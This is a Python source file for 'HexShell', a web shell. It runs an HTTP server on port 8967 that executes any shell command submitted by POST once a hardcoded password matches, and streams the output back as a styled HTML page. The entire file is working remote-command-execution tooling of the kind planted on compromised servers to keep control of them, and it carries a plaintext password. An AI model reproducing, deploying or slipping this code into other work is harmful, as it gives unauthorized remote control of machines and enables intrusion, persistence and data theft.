from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import subprocess
import platform
import requests
import json

PASSWORD = "83X58311"

print("""
 __   __  _______  __   __  _______  __   __  _______  ___      ___     
|  | |  ||       ||  |_|  ||       ||  | |  ||       ||   |    |   |    
|  |_|  ||    ___||       ||  _____||  |_|  ||    ___||   |    |   |    
|       ||   |___ |       || |_____ |       ||   |___ |   |    |   |    
|       ||    ___| |     | |_____  ||       ||    ___||   |___ |   |___ 
|   _   ||   |___ |   _   | _____| ||   _   ||   |___ |       ||       |
|__| |__||_______||__| |__||_______||__| |__||_______||_______||_______|
""")

INDEX = requests.get("https://raw.githubusercontent.com/Falcn8/hexshell/master/index.html").text

class Webshell(BaseHTTPRequestHandler):
    def _send_response(self, message):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(bytes(message, "utf8"))

    def do_GET(self):
        if self.path.lower() == "/favicon.ico":
            self.send_response(400)
            return
        if self.path.lower() == "/close":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'Closing webserver')
            httpd.server_close()
            print("\nClose requested\nExiting...")
            exit()
        print(self.__dict__)
        self._send_response(INDEX.replace("{{PLATFORM}}", str(platform.platform())))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        query = urllib.parse.parse_qs(post_data)
        if not "cmd" in query or not "pw" in query:
            self.send_response(400)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'Please specify the command and the password')
            return
        with open("hexshell.access.log", "a+") as f:
            f.write(str(query["pw"][0] == PASSWORD)+" "+str(self.client_address[0])+" "+json.dumps(query)+"\n")
        if query["pw"][0] != PASSWORD:
            self.send_response(403)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'403 Forbidden')
            return
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<!DOCTYPE html><html><head><title>HexShell</title>')
        self.wfile.write(b'<link rel="shortcut icon" href="https://github.com/Falcn8/HexShell/blob/master/HexShell.jpg?raw=true"/>')
        self.wfile.write(b'<link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet"><style>')
        self.wfile.write(b'@font-face {font-family:Aquire;src:url("https://raw.githubusercontent.com/Falcn8/hexshell/master/Aquire-BW0ox.otf") format("opentype");}')
        self.wfile.write(b'@font-face {font-family:Inder;src:url("https://raw.githubusercontent.com/Falcn8/hexshell/master/Inder-Regular.ttf");}')
        self.wfile.write(b'h1, h3 {font-family: Aquire !important;}')
        self.wfile.write(b'body {font-family: Inder;}')
        self.wfile.write(b'</style></head><body class="bg-gray-100">')
        self.wfile.write(b'<h1 class="text-3xl font-medium text-center mx-auto mt-10"><a href="/">HexShell</a></h1>')
        self.wfile.write(b'<h3 class="text-lg font-normal text-center mx-auto">'+platform.platform().encode())
        self.wfile.write(b'</h3><div class="bg-white p-6 rounded-lg shadow-md mx-auto my-10 max-w-screen-md overflow-auto">')
        self.wfile.write(b'<pre class="text-gray-700">')
        process = subprocess.Popen(query["cmd"][0], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            output = process.stdout.readline().decode()
            if output == '' and process.poll() is not None:
                break
            if output:
                self.wfile.write(bytes(output, "utf8"))
                self.wfile.flush()
        self.wfile.write(b'</pre></div><p class="text-center text-gray-700 text-xs py-2">&#169; Copyright by <a href="https://github.com/Falcn8" class="text-green-500 hover:underline">hexagon</a></p></body></html>')

httpd = HTTPServer(('', 8967), Webshell)
print("Serving on port 8967\n")
try:
    while True:
        httpd.handle_request()
except KeyboardInterrupt:
    print("\nCtrl-C detected\nExiting...")
    httpd.server_close()
    exit()
